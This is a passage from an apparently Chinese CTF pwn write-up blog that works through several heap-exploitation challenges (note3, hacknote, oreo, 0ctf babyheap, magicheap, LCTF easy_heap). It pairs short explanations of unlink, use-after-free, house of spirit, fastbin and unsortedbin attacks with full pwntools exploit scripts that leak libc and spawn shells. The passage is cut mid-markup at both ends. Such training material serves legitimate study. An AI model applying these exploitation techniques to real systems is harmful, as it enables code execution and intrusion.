class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./note3&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">newnote</span>(<span class="params">size,content</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;:(less than 1024)\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27; content:\n&#x27;</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;id of the note:\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="comment">#p.recvuntil(b&#x27;Delete success\n&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">idx,content</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;the note:\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;new content:\n&#x27;</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"><span class="comment">#p.recvuntil(b&#x27;Edit success\n&#x27;)</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./note3&#x27;</span>)</span><br><span class="line">chunk0_ptr_addr=<span class="number">0x6020C8</span></span><br><span class="line">newnote(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">newnote(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">newnote(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span>+p64(<span class="number">0x20</span>)+p64(<span class="number">0x41</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x20</span>)+p64(chunk0_ptr_addr-<span class="number">0x10</span>)+p64(chunk0_ptr_addr-<span class="number">0x8</span>)+p64(<span class="number">0x20</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">change(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span>+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">change(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>,p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">change(<span class="number">1</span>,p64(sys_addr)[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>说一下刚才提到的坑</strong>,就是程序自定义的输入函数,会将输入的最后一个字符的后一字节置为0或者遇到换行符将换行符置为0,这里是第二种情况</p><p>因此在写一个got表时,就会把这个got附近的got表给修改掉,从而使程序异常退出,被一脸懵逼地卡了好久</p><p>解决办法就是p64(elf.plt[‘puts’])[:-1]这样,只发送8个字节,且第八个字节被置为0,不影响本来的数据(高地址本来就是0),如果不这样的话相邻的got表的最低字节就会变成0</p><p><strong>说到底还是怪自己没注意sendline.</strong></p><p>另外还学到了伪造unlink后项chunk的方法,即通过后项的后项的size判断后项是否被使用,并以此绕过</p><h2 id="HITCON-training-lab-10-hacknote"><a href="#HITCON-training-lab-10-hacknote" class="headerlink" title="HITCON-training lab 10 hacknote"></a>HITCON-training lab 10 hacknote</h2><p><strong>难度:★</strong></p><p>防护nx和canary</p><p>利用点是UAF,delete函数只是free没有置0,意味着其他函数照样可以继续使用该chunk,但是其又可以被分配给新的note,这样我们就具有了修改一个可以被使用的note的头的能力</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addnote</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntilb(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">b&quot;aaaa&quot;</span>) <span class="comment"># add note 0</span></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">b&quot;ddaa&quot;</span>) <span class="comment"># add note 1</span></span><br><span class="line"></span><br><span class="line">delnote(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">delnote(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>) <span class="comment"># print note 0</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="2014-hack-lu-oreo"><a href="#2014-hack-lu-oreo" class="headerlink" title="2014 hack.lu oreo"></a>2014 hack.lu oreo</h2><p><strong>难度:★★</strong></p><p>防护照旧</p><p>很容易发现添加操作时的读取溢出,且申请的chunk的最后四字节存放上一个chuk的指针</p><p>即用单链表存储申请的chunk</p><p>加上溢出可以控制这个指针</p><p>写的功能除了add就只剩下leave_messa了</p><p>且free时就是按照单链表来取出chunk逐个free</p><p>故利用点是house of spirit,方向是在message指向处伪造chunk,刚好程序存在一个记录chunk数的内存域,可以被视为size,只要chunk数量刚好对齐</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./oreo&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./oreo&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name,des</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="comment">#p.recvuntil(b&#x27;Rifle name: &#x27;)</span></span><br><span class="line">    p.sendline(name)</span><br><span class="line">    <span class="comment">#p.recvuntil(b&#x27;Rifle description: &#x27;)</span></span><br><span class="line">    p.sendline(des)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">order</span>():</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">message</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    <span class="comment">#p.recvuntil(b&quot;Enter any notice you&#x27;d like to submit with your order: &quot;)</span></span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line">name=<span class="string">b&#x27;a&#x27;</span>*<span class="number">27</span>+p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">add(name,<span class="string">b&#x27;\n&#x27;</span>*<span class="number">25</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Description: &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Description: &#x27;</span>)</span><br><span class="line">puts_addr=p.recv(<span class="number">4</span>)</span><br><span class="line">puts_addr=u32(puts_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">base_addr=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system=base_addr+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system))</span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> (count &lt; <span class="number">0x3f</span>):</span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">4</span>)</span><br><span class="line">count+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">27</span>+p32(<span class="number">0x804a2a8</span>)</span><br><span class="line">add(payload,<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span>)</span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x20</span>+p32(<span class="number">0x40</span>)+p32(<span class="number">0x100</span>)</span><br><span class="line">message(payload)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">order()</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil(&#x27;Okay order submitted!\n&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload = p32(elf.got[<span class="string">&#x27;strlen&#x27;</span>])</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">20</span>, payload)</span><br><span class="line"></span><br><span class="line">message(p32(system) + <span class="string">b&#x27;;/bin/sh\x00&#x27;</span>)<span class="comment">#;执行多个命令,写完后立马执行</span></span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>再次记一下,puts函数遇到空字符结束,且必然会在结尾添加一个’\n’,无论结尾本身是否有换行</strong></p><h2 id="2015-9447-CTF-Search-Engine"><a href="#2015-9447-CTF-Search-Engine" class="headerlink" title="2015 9447 CTF : Search Engine"></a>2015 9447 CTF : Search Engine</h2><p><strong>难度:★★★</strong></p><p>这题的难度有一部分在于程序本身较为复杂,静态分析需要不少功夫</p><h2 id="2017-0ctf-babyheap"><a href="#2017-0ctf-babyheap" class="headerlink" title="2017 0ctf babyheap"></a>2017 0ctf babyheap</h2><p><strong>难度:★★★</strong></p><p>这题开启了pie和以上几题不同</p><p>这题关键的漏洞在于填充申请的chunk时,大小是我们自己任意指定的,而不是申请时的大小,意味着几乎无限制溢出</p><p>攻击中用到fastbin attack与unsortedbin attack</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./babyheap&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./babyheap&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_arena_offset=libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]+<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">idx,content</span>):</span><br><span class="line">    p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Size: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content: &quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>)  <span class="comment">#idx0</span></span><br><span class="line">alloc(<span class="number">0x10</span>)  <span class="comment">#idx1</span></span><br><span class="line">alloc(<span class="number">0x10</span>)  <span class="comment">#idx2</span></span><br><span class="line">alloc(<span class="number">0x10</span>)  <span class="comment">#idx3 for overflow idx4</span></span><br><span class="line">alloc(<span class="number">0x80</span>)  <span class="comment">#idx4</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)  <span class="comment">#头插法 layout fastbin[0]-&gt;idx1-&gt;idx2-&gt;NULL</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p8(<span class="number">0x80</span>)<span class="comment">#fixed size</span></span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>)<span class="comment">#get idx1</span></span><br><span class="line">alloc(<span class="number">0x10</span>)<span class="comment">#get idx4</span></span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x10</span> * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x80</span>)<span class="comment">#idx5 avoid consolidate to top</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content: \n&#x27;</span>)</span><br><span class="line">unsortedbin_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(unsortedbin_addr))</span><br><span class="line">main_arena=unsortedbin_addr-<span class="number">88</span></span><br><span class="line">libc_base=main_arena-main_arena_offset</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">fake_chunk_addr = main_arena - <span class="number">0x33</span></span><br><span class="line">fake_chunk = p64(fake_chunk_addr)</span><br><span class="line">fill(<span class="number">2</span>,fake_chunk)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">one_gadget_addr = libc_base + <span class="number">0x4527a</span></span><br><span class="line">payload = <span class="number">0x13</span> * <span class="string">b&#x27;a&#x27;</span> + p64(one_gadget_addr)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br><span class="line">alloc(<span class="number">0x100</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>一个很关键的点在要从idx4中切割出第一个0x70大小的chunk,这样再把这个chunk释放掉才能直接控制fd,当然另外申请0x70大小的也是可行的,要多麻烦几步就是了</p><p><strong>小记0x7-0xa</strong></p><h2 id="HITCON-Training-lab14-magic-heap"><a href="#HITCON-Training-lab14-magic-heap" class="headerlink" title="HITCON Training lab14 magic heap"></a>HITCON Training lab14 magic heap</h2><p><strong>难度:★</strong></p><p>功能可以说是非常常规了,保护照旧nx和canary</p><p>漏洞点是edit时大小是由自己定的,无限制溢出</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./magicheap&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_heap</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_heap</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">del_heap</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create_heap(<span class="number">0x20</span>, <span class="string">b&quot;dada&quot;</span>)  <span class="comment"># 0</span></span><br><span class="line">create_heap(<span class="number">0x80</span>, <span class="string">b&quot;dada&quot;</span>)  <span class="comment"># 1</span></span><br><span class="line"><span class="comment"># in order not to merge into top chunk</span></span><br><span class="line">create_heap(<span class="number">0x20</span>, <span class="string">b&quot;dada&quot;</span>)  <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">del_heap(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x6020c0</span></span><br><span class="line">fd = <span class="number">0</span></span><br><span class="line">bk = magic - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">edit_heap(<span class="number">0</span>, <span class="number">0x20</span> + <span class="number">0x20</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(fd) + p64(bk))</span><br><span class="line">create_heap(<span class="number">0x80</span>, <span class="string">b&quot;dada&quot;</span>)  <span class="comment">#trigger unsorted bin attack</span></span><br><span class="line">r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">b&quot;4869&quot;</span>)</span><br><span class="line">gdb.attach(r)</span><br><span class="line">pause()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="LCTF2018-PWN-easy-heap"><a href="#LCTF2018-PWN-easy-heap" class="headerlink" title="LCTF2018 PWN easy_heap"></a>LCTF2018 PWN easy_heap</h2><p><strong>难度:★★★</strong></p><p>保护全开</p><p>难度有一部分是来与堆tcache的不熟悉,以及其综合运用了unosrtedbin的许多相关利用点,主要还是太久没学,对堆的知识有些生分了</p><p> 学习的第一道带tcache bin的堆题,借此巩固自己堆tchche的学习</p><p>程序在自己实现的读入函数中存在off-by-null的漏洞</p><p>最多可以添加10个chunk</p><p>如果释放chunk那么前7个是会进入tcache的</p><p>利用的主要点自然是off-by-null,达到overlapping或extended的效果</p><p>但由于tcache以及本题固定大小chunk的影响显然不能直接利用</p><p>于是在凑满tcache后,再释放三个相临的chunk(命名为A,B,C)使之合并,这样c的prev_size段就被写为了0x200,</p><p>只要put null在其inuse位再释放就可以将之前的chunk包括进来,如果此时ab有处于使用状态的,则可以借机达到double free的效果</p><p>之后修改__free_hook为onegadget或者system之类皆可</p><p>另外因为本题无修改功能,因此只能重新分配改写字段</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 